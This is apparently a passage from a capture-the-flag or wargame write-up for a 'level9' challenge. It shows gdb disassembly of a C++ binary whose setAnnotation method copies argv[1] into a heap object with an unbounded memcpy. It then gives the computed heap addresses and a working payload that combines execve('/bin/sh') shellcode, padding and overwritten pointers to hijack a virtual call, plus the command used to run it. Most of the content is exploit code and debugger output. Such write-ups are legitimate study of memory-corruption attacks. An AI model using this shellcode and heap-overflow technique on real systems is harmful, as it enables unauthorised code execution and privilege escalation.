   0x0804864b <+87>:    call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:    mov    DWORD PTR [esp+0x18],ebx
   0x08048654 <+96>:    mov    eax,DWORD PTR [esp+0x1c]
   0x08048658 <+100>:   mov    DWORD PTR [esp+0x14],eax
   0x0804865c <+104>:   mov    eax,DWORD PTR [esp+0x18]
   0x08048660 <+108>:   mov    DWORD PTR [esp+0x10],eax
   0x08048664 <+112>:   mov    eax,DWORD PTR [ebp+0xc]
   0x08048667 <+115>:   add    eax,0x4
   0x0804866a <+118>:   mov    eax,DWORD PTR [eax]
   0x0804866c <+120>:   mov    DWORD PTR [esp+0x4],eax
   0x08048670 <+124>:   mov    eax,DWORD PTR [esp+0x14]
   0x08048674 <+128>:   mov    DWORD PTR [esp],eax
   0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:   mov    eax,DWORD PTR [esp+0x10]
   0x08048680 <+140>:   mov    eax,DWORD PTR [eax]
   0x08048682 <+142>:   mov    edx,DWORD PTR [eax]
   0x08048684 <+144>:   mov    eax,DWORD PTR [esp+0x14]
   0x08048688 <+148>:   mov    DWORD PTR [esp+0x4],eax
   0x0804868c <+152>:   mov    eax,DWORD PTR [esp+0x10]
   0x08048690 <+156>:   mov    DWORD PTR [esp],eax
   0x08048693 <+159>:   call   edx
   0x08048695 <+161>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x08048698 <+164>:   leave  
   0x08048699 <+165>:   ret    
End of assembler dump.
(gdb) disas 0x0804870e
Dump of assembler code for function _ZN1N13setAnnotationEPc:
   0x0804870e <+0>:     push   ebp
   0x0804870f <+1>:     mov    ebp,esp
   0x08048711 <+3>:     sub    esp,0x18
   0x08048714 <+6>:     mov    eax,DWORD PTR [ebp+0xc]
   0x08048717 <+9>:     mov    DWORD PTR [esp],eax
   0x0804871a <+12>:    call   0x8048520 <strlen@plt>
   0x0804871f <+17>:    mov    edx,DWORD PTR [ebp+0x8]
   0x08048722 <+20>:    add    edx,0x4
   0x08048725 <+23>:    mov    DWORD PTR [esp+0x8],eax
   0x08048729 <+27>:    mov    eax,DWORD PTR [ebp+0xc]
   0x0804872c <+30>:    mov    DWORD PTR [esp+0x4],eax
   0x08048730 <+34>:    mov    DWORD PTR [esp],edx
   0x08048733 <+37>:    call   0x8048510 <memcpy@plt>
   0x08048738 <+42>:    leave  
   0x08048739 <+43>:    ret    
End of assembler dump.
(gdb) x/wx $esp+0x1c
0xbffff72c:     0x0804a008
(gdb) x/wx $esp+0x18 
0xbffff728:     0x08048779
```


a = 0x0804a008
a->_annotation = 0x0804a00c
b malloc header = 0x0804a074
b = 0x08048779
b->_annotation = 0x0804877d
N::operator+ = 0x0804873a

b'1\xc0P\x04\x0bh//shh/bin\x89\xe31\xc91\xd2\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x0c\xa0\x04\x08t\xa0\x04\x08\n'

`./level9.sh | tr -d '\n' | python -c 'print(open(0, "rb").read())' ; python level9.py`